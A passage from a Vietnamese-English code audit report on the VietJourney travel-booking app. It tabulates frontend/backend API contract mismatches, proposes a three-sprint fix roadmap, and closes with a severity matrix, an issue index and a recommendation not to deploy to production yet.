| Search flights | `GET /api/flights` (params: departureAirport, arrivalAirport, departureTime, pageable) | `GET /api/flights/search` (params: from, to, departDate, tripType, adults, ...) | ❌ URL + param name mismatch |
| Response | `Page<FlightDTO>` (id, airlineCode, flightNumber, departureAirport, departureTime, ...) | `FlightSearchResponse` ({ outbound: Flight[], return?: Flight[], request }) | ❌ Completely different shape |
| `Flight.flightNo` | (none — BE có `flightNumber` + `airlineCode` riêng) | `string` | ❌ Different shape |

### 7.4. Payment Contract

| Endpoint | BE | FE | Status |
|---|---|---|---|
| Create payment | `POST /api/payments/create` body: `{ bookingId: Long, paymentMethod: String }` | `POST /payments/create` body: `{ bookingId: string, paymentMethod: 'VNPAY' }` | ⚠️ `bookingId` type mismatch (Long vs string) |
| Response | `PaymentResponse` (`paymentUrl`, `transactionRef`, `status`) | FE expects `{ paymentUrl }` | ✓ OK |
| Callback | `GET /api/payments/callback` | `GET /payments/callback` | ✓ OK |

### 7.5. Tour Contract

| Field | BE `TourDTO` | FE `Tour` (api/tours.ts) | Status |
|---|---|---|---|
| `id` | `Long` | `string` | ⚠️ Type |
| `overview` | `TourDetailDTO` only | (not in list `Tour`) | ⚠️ Different between list and detail |
| `itineraries` | `TourDetailDTO.itinerary` (List<ItineraryDTO>) | `itineraries` (string) | ❌ Type |

### 7.6. Admin Contract

| Endpoint | BE | FE | Status |
|---|---|---|---|
| Get stats | `GET /api/admin/stats` returns `{ totalBookings, revenue }` | expect `Kpi` ({ totalRevenue, totalBookings, totalFlights, loadFactor, trends }) | ❌ Missing fields |
| List flights | (none) | `GET /admin/flights` | ❌ Missing BE |
| List bookings | (none) | `GET /admin/bookings` | ❌ Missing BE |
| List users | (none) | `GET /admin/users` | ❌ Missing BE |
| List news | (none) | `GET /admin/news` | ❌ Missing BE |
| Update user role | (none) | `PUT /admin/users/{id}/roles` | ❌ Missing BE |
| CRUD news | (none) | POST/DELETE `/admin/news` | ❌ Missing BE |

**Kết luận**: Toàn bộ admin module BE chưa implement. FE đang dùng mock.

### 7.7. Booking Search Contract

| Endpoint | BE | FE | Status |
|---|---|---|---|
| `GET /api/bookings/search` | params: `code` (BK + Long), `lastName` | params: `code` (BK1234), `lastName` | ⚠️ BE strip "BK" prefix; FE expects `bookingCode` field |

---

## 8. Phần F — ROADMAP FIX ĐỀ XUẤT

> Phân loại thành 3 sprint. Mỗi sprint ước lượng effort theo story point (1 SP = 0.5 ngày dev).

### 8.1. Sprint 1 — Critical Fixes (1–2 tuần, ~30 SP)

**Mục tiêu**: App chạy được end-to-end; không leak inventory; không leak JWT.

| ID | Task | Effort | Priority |
|---|---|---|---|
| BE-CRIT-01 | Fix scheduler release inventory | 3 SP | P0 |
| BE-CRIT-03 | Reorder VNPay verify (signature first) | 1 SP | P0 |
| BE-CRIT-04 | Implement `/api/payments/ipn` endpoint | 3 SP | P0 |
| BE-CRIT-06 | Check ownership in `createPayment` | 1 SP | P0 |
| BE-CRIT-09 | Add `IllegalStateException` handler | 0.5 SP | P0 |
| BE-HIGH-01 | Set cookie on `/auth/refresh` | 1 SP | P0 |
| FE-CRIT-01 | Remove token from localStorage persist | 1 SP | P0 |
| FE-CRIT-02 | Fix refresh flow end-to-end | 2 SP | P0 |
| FE-CRIT-03 | Sync `role` vs `roles` | 2 SP | P0 |
| FE-CRIT-04 | Fix PaymentPage status check | 0.5 SP | P0 |
| FE-CRIT-05 | Sync BookingDTO ↔ FlightBooking | 5 SP | P0 |
| FE-CRIT-06 | HeroSearch dùng `searchFlights` | 0.5 SP | P0 |
| FE-CRIT-07 | Fix `temp-id` flow | 3 SP | P0 |
| DB-CRIT-01 | Fix V29 column reference | 0.5 SP | P0 |
| DB-CRIT-03 | Add UNIQUE on `payments.transaction_ref` | 0.5 SP | P0 |
| FE-HIGH-04 | Fix `/flights/search` URL | 0.5 SP | P0 |
| FE-HIGH-09 | Fix `api.get` params nesting | 1 SP | P0 |
| INFRA-CRIT-01 | Add `SPRING_PROFILES_ACTIVE` + prod profile | 1 SP | P0 |
| **Subtotal** | | **27 SP** | |

### 8.2. Sprint 2 — High Priority Fixes (2–3 tuần, ~35 SP)

**Mục tiêu**: Production-ready cơ bản; admin module hoạt động.

| ID | Task | Effort | Priority |
|---|---|---|---|
| BE-CRIT-02 | Rate limit `/api/bookings` + validate passengers size | 2 SP | P1 |
| BE-CRIT-05 | Move VNPay IPs to config + RemoteIpValve | 2 SP | P1 |
| BE-CRIT-07 | Cache UserDetails hoặc include role in JWT | 3 SP | P1 |
| BE-CRIT-08 | Fix user enumeration in login | 1 SP | P1 |
| BE-HIGH-02 | Make filters Spring beans | 1 SP | P1 |
| BE-HIGH-03 | Apply `PageableUtil` globally | 2 SP | P1 |
| BE-HIGH-04 | Return revenue as number | 0.5 SP | P1 |
| BE-HIGH-05 | Update TourServiceImpl.updateTour collections | 3 SP | P1 |
| BE-HIGH-06 | Configure ThreadPoolTaskExecutor | 1 SP | P1 |
| BE-HIGH-08 | CSRF protection hoặc SameSite=Strict | 2 SP | P1 |
| BE-HIGH-09 | Rate limit `/auth/register` | 1 SP | P1 |
| BE-HIGH-10 | Sanitize Blog.content with Safelist.relaxed | 1 SP | P1 |
| BE-HIGH-14 | Add `@Valid` + `@Size` on BookingRequest.passengers | 0.5 SP | P1 |
| FE-HIGH-01 | Call `/auth/me` on app init | 2 SP | P1 |
| FE-HIGH-02 | Sync BookingApi.get types | 1 SP | P1 |
| FE-HIGH-03 | Implement `updatePassengers` BE endpoint | 2 SP | P1 |
| FE-HIGH-05 | Wire `TourDetailPage.handleBook` to API | 2 SP | P1 |
| FE-HIGH-06 | Implement admin endpoints BE | 8 SP | P1 |
| FE-HIGH-07 | Remove `\|\| true` in admin api | 0.5 SP | P1 |
| FE-HIGH-08 | Generate types from OpenAPI | 3 SP | P1 |
| DB-HIGH-01 | Add CHECK constraints | 1 SP | P1 |
| DB-HIGH-04 | Sync tours.rating with reviews | 2 SP | P1 |
| DB-HIGH-05 | Add notifications index | 0.5 SP | P1 |
| INFRA-HIGH-01 | Pass VITE_API_URL in Dockerfile | 0.5 SP | P1 |
| INFRA-HIGH-03 | Add backend healthcheck | 1 SP | P1 |
| **Subtotal** | | **43.5 SP** | |

### 8.3. Sprint 3 — Medium + Low (2 tuần, ~25 SP)

**Mục tiêu**: Hardening, DX improvements, cleanup.

| ID | Task | Effort | Priority |
|---|---|---|---|
| BE-MED-01 | Remove `@Builder` from JPA entities | 2 SP | P2 |
| BE-MED-06 | Fix `isAccountNonLocked` to check `lockedUntil` | 0.5 SP | P2 |
| BE-MED-11 | Validate sort field whitelist | 1 SP | P2 |
| FE-MED-01 | Add reset to ErrorBoundary | 0.5 SP | P2 |
| FE-MED-02 | Self-host images | 2 SP | P2 |
| FE-MED-03 | Wire dashboard stats to API | 1 SP | P2 |
| FE-MED-04 | Fix useCountdown cleanup | 0.5 SP | P2 |
| FE-MED-05 | Read requiredSeats from booking | 1 SP | P2 |
| FE-MED-07 | Import Material Symbols font | 0.5 SP | P2 |
| DB-MED-01 | Add CHECK `old_price > price` | 0.5 SP | P2 |
| DB-MED-02 | Add CHECK `available_seats >= 0` | 0.5 SP | P2 |
| DB-MED-04 | Use ENUM for payments.status | 1 SP | P2 |
| DB-MED-05 | Add index on blogs.published_at | 0.5 SP | P2 |
| BE-HIGH-11 | Use `HexFormat.of().formatHex` | 0.5 SP | P2 |
| BE-HIGH-12 | Bump jjwt to 0.12.x | 1 SP | P2 |
| BE-LOW-01 | Merge `utils/` and `util/` | 0.5 SP | P2 |
| FE-LOW-05 | i18n English strings in DashboardPage | 1 SP | P2 |
| **Subtotal** | | **14.5 SP** | |

---

### 8.4. Long-term Recommendations (Sprint 4+)

1. **Codegen types from OpenAPI** — loại bỏ hoàn toàn issue contract mismatch. Sử dụng `openapi-generator-cli` để generate TS types + axios client.
2. **Integration test end-to-end** với Testcontainers (MySQL + Redis) — chạy toàn bộ flow auth → booking → payment.
3. **Observability**: Spring Boot Actuator + Micrometer + Prometheus; Grafana dashboard.
4. **Distributed tracing**: OpenTelemetry + Jaeger.
5. **Database migration testing**: Testrollback mỗi migration.
6. **CI/CD pipeline**: GitHub Actions → lint → test → build → deploy staging → smoke test → deploy prod.
7. **Secret management**: Vault hoặc AWS Secrets Manager thay vì env var plaintext.
8. **Multi-instance ready**: Caffeine cache → Redis cache; Rate limit cache → Redis-backed Bucket4j.
9. **API versioning**: `/api/v1/...` thay vì `/api/...`.
10. **GraphQL hoặc gRPC** cho internal service communication (nếu tách microservices).

---

## 9. Phụ lục: Ma trận Severity

### 9.1. Tổng quan

```
┌────────────────────────────────────────────────────────────────┐
│                   SEVERITY DISTRIBUTION                         │
├────────────┬──────┬──────┬─────┬───────┬────────────────────────┤
│ Severity   │  BE  │  FE  │ DB  │ Infra │ Total                  │
├────────────┼──────┼──────┼─────┼───────┼────────────────────────┤
│ 🔴 Critical│   9  │   7  │  4  │   1   │   21                   │
│ 🟠 High    │  14  │  11  │  6  │   3   │   34                   │
│ 🟡 Medium  │  11  │   9  │  5  │   2   │   27                   │
│ 🟢 Low     │   5  │   6  │  3  │   1   │   15                   │
├────────────┼──────┼──────┼─────┼───────┼────────────────────────┤
│ TOTAL      │  39  │  33  │ 18  │   7   │   97                   │
└────────────┴──────┴──────┴─────┴───────┴────────────────────────┘
```

### 9.2. CVSS-style Scoring Legend

| Score | Severity | Meaning |
|---|---|---|
| 9.0–10.0 | Critical | Production blocker / data loss / security breach |
| 7.0–8.9 | High | Major feature broken / security risk |
| 4.0–6.9 | Medium | Functional issue / minor security |
| 0.1–3.9 | Low | Code quality / minor UX |

### 9.3. Issue Index (sorted by severity)

#### Critical (21)
- BE-CRIT-01: Scheduler leak inventory
- BE-CRIT-02: Booking no rate limit + anonymous
- BE-CRIT-03: VNPay verify order
- BE-CRIT-04: IPN endpoint missing
- BE-CRIT-05: VnpayIpnFilter hardcoded + proxy issue
- BE-CRIT-06: Payment no ownership check
- BE-CRIT-07: JwtFilter DB hit per request
- BE-CRIT-08: User enumeration
- BE-CRIT-09: IllegalStateException not handled
- FE-CRIT-01: JWT in localStorage
- FE-CRIT-02: Refresh flow broken
- FE-CRIT-03: role vs roles mismatch
- FE-CRIT-04: PaymentPage redirect bug
- FE-CRIT-05: BookingDTO field mismatch
- FE-CRIT-06: HeroSearch always mock
- FE-CRIT-07: temp-id flow broken
- DB-CRIT-01: V29 column reference
- DB-CRIT-02: airports dropped, no FK
- DB-CRIT-03: payments.transaction_ref no UNIQUE
- DB-CRIT-04: polymorphic associations
- INFRA-CRIT-01: No SPRING_PROFILES_ACTIVE

#### High (34)
- BE-HIGH-01 → BE-HIGH-14 (xem Section 4.2)
- FE-HIGH-01 → FE-HIGH-11 (xem Section 3.2)
- DB-HIGH-01 → DB-HIGH-06 (xem Section 5.3)
- INFRA-HIGH-01 → INFRA-HIGH-03 (xem Section 6.2)

#### Medium (27) — xem Sections 3.3, 4.3, 5.4, 6.3
#### Low (15) — xem Sections 3.4, 4.4, 5.5, 6.4

---

## Kết luận

VietJourney Advance Solution có **nền tảng kiến trúc tốt** (Strategy pattern, state machine, optimistic lock, EntityGraph, Caffeine cache, Flyway, comments giải thích "tại sao") và nhiều best practice đáng khen. Tuy nhiên:

1. **Layer contract giữa BE và FE đang vỡ** ở các flow chính (Auth → Booking → Payment) — đây là vấn đề lớn nhất. App **không chạy được end-to-end** ở trạng thái hiện tại.

2. **Scheduler leak ghế** là bug production nghiêm trọng cần fix ngay nếu deploy thật — inventory sẽ về 0 sau vài ngày.

3. **Security primitives đúng ở tầng thấp (BCrypt, JWT signature, HttpOnly cookie) nhưng sai ở tầng cao** (localStorage leak, VNPay verify order, user enumeration, no ownership check).

4. **DB schema có 1 migration broken (V29)** + **polymorphic associations không có FK** + **thiếu index** ở vài chỗ quan trọng.

5. **Admin module BE chưa implement** — FE đang dùng mock.

6. **Observability + CI/CD + profile config** chưa có — cần thiết cho production.

**Khuyến nghị cuối**: **KHÔNG deploy production** ở trạng thái hiện tại. Ưu tiên Sprint 1 (27 SP, ~1–2 tuần) để fix 21 Critical issue, sau đó chạy integration test end-to-end trước khi tiếp tục Sprint 2.

---

> **Báo cáo kết thúc.**
> Review-only — KHÔNG fix. Tổng cộng **97 issue** đã được liệt kê với severity, file:line, code snippet, root cause, CVSS-style score, và recommendation.
